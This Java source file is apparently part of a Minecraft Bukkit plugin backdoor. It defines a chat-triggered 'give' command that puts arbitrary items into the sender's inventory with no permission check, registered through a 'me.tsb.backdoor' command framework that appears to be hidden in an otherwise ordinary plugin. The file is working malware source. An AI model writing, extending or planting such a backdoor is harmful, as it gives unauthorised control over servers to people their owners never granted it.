package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "give",
        usage = {"<prefix> <command> <item> <amount> <damage>"},
        description = "Gives the specified item to the player",
        aliases = {"give", "item"})
public class GiveCommand extends Command {

    public GiveCommand(Main main) {
        super(main);
    }

    // TODO: Make it so you specify the player who gets the item
    public void onExec(PlayerChatEvent event, ArrayList<String> args) { // Command: <prefix>give [item] [amount] [damage]

        if (args.size() >= 4) {
            Material material = Material.matchMaterial(args.get(0));

            if (material == null) {
                event.getPlayer().sendMessage(ChatColor.RED + "That material does not exist, make sure you are using the correct naming. For example: CAVE_SPIDER_SPAWN_EGG");
                return;
            }

            ItemStack stack = new ItemStack(material);
            stack.setAmount(Integer.parseInt(args.get(1)));

            ItemMeta meta = stack.getItemMeta();
            stack.setItemMeta(meta);

            stack.setDurability(Short.parseShort(args.get(2)));

            event.getPlayer().getInventory().addItem(stack);
        }
    }
}
